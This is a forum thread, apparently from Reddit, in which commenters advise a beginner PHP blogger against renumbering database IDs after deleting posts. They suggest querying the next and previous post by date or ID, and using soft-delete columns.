You can change IDs if you want, but its usually not a very good idea. &amp;#x200B; Do you have a valid use case for doing this?
You probably can write a stored procedure for this if you really want to (though that is more of an SQL than a PHP question), but there are some important issues with doing this while there are very few benefits that would offset those. For one, consider that if you use links of the format http://blog.example.com/blogpost?id=5, that link would break upon re-numbering, and anyone that has linked to your blog post is now stuck with a broken link. Additionally, any other content referring to the blog post (your comments table, for example) would need to be updated as well. It also creates some interesting race conditions (what happens if someone comments on a blog post at the same time you're deleting another one? Do they get an error because the post ID submitted with their comment suddenly doesn't point to a valid post anymore?) All of this has the potential to generate some real headaches further down the line, or a lot of code if you want to get it right from the beginning, for virtually no benefit. Yes, your database would look 'neater', but ideally you're not looking at your database all that often anyway, so who cares, really? And you're probably using a data type for your ID column that can hold integers of such a size that running out of IDs is not going to be a concern for the next few centuries, either. TL;DR yes, but there is no reason to do this, and there are multiple reasons not to do it.
The actual value of the id column should be meaningless except that it provides a key for the row. Or in other words, even if you could update the DB like that, there shouldn't be any reason to. The problem is that it's inefficient. To do this, you would have to scan the table for an empty index before doing the insert. Not a big deal if you have 5 rows, but when you're talking about a real world DB, maybe it's index 12542 that's empty, but to find that out you'd have to look at 12541 rows before it. As long as the id field functions only as a key for a row, then it doesn't matter what number it is as long as it's not a duplicate of any other number. 
Remember that this will break any existing links to your posts. Instead, fetch the next id by doing `SELECT id FROM posts WHERE date &gt; '&lt;date of the current post' ORDER BY date LIMIT 1` and one query with `date &lt; &lt;date of current post&gt; ORDER BY date DESC LIMIT 1`.
It kind of is, BUT: you don't want to do this. And ID - Identifier - is there to stay and never to be changed. Imagine you have a second table "Comments(id, post\_id, comment) - you'd then have a comment table that suddenly changed it's post\_id - so you'd have to change the post\_id in those tables, too - that's not a good thing. Furthermore, a little bit down the line people will suddenly tell you that auto\_increment IDs are a "bad" thing. Because you're always able to predict the IDs for future posts. While it may not be a bad thing in general for a simple post, in other scenarios (user\_ids, just to name one) this can probe problems. People will then suggest that your IDs should be something that can not be predicted. For example a UUID (v4). &amp;#x200B; So yeah, in theory you could do an update query where you do something like "UPDATE posts SET id = id-1 WHERE id &gt; $deletedID" but please don't - you'll just be running into lots of trouble down the line and you'll make everything harder for yourself. An IDENTIFIER should never be changed.
I also learned the lesson the hard way. &gt; Thou shall not speak ill about Wordpress or their fellows Wordpress-developers on Reddit. See ya. 
Thank you very much. I'll try this very soon.
Alternatively, fetch the previous and next ID from the database before displaying the page. This is a good idea anyway so you can omit the links if there is, in fact, no next or previous post to display. Or, if you really can't do this (but you probably can), do something like ?id=[current_post]&amp;navigate=next, and acquire the ID of the next post via `SELECT * FROM posts WHERE id &gt; [current_post] ORDER BY id ASC LIMIT 1` when that page is requested.
update ok, I understand, that to change id is terrible idea. so, maybe someone could help me to make buttons to go to next/previous post? p.s im creating very simple blog for my lecture. p.s.s im begginer in php :D
It’s a terrible idea
The correct way to do this as add a published_on datetime column. Your previous post will be the first post before the current posts's published_on datetime. Do not rely on the auto increment's order for anything. For deleting posts I would recommend adding a deleted_on datetime column as well and instead of deleting the record from the database just set the deleted_on date to now, and then you can only query posts which don't have a deleted_on date. That way you never destroy data. And if you need to free up space later you can do a manual query to delete all posts that have a deleted_on date.
Sad but true. WordPress will die eventually, though. However, Wix, Weebly, Squarespace, etc. won't be what does it because they're ultimately delivered as SaaS applications. Someday someone will build a PHP powered WordPress killer that will take the web by storm. Mark my words.
No mention of get result makes this post of little value. But may be for someone who cannot figure how to run an UPDATE query knowing how to run INSERT, it could be useful.